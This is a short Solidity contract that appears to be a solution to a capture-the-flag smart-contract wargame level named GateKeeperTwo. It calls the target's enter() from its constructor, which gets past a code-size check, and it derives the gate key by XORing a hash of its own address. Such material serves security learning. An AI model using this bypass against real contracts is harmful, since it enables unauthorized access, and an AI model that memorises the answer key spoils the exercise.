pragma solidity 0.8.4;

import "hardhat/console.sol";

interface GateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperSolution {
    GateKeeperTwo private gk;
    address private gkAddress;

    constructor(address _gkAddress) {
        gkAddress = _gkAddress;
        gk = GateKeeperTwo(_gkAddress);

        bytes8 _gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                uint64(0xFFFFFFFFFFFFFFFF)
        );

        gk.enter(_gateKey);
    }
}
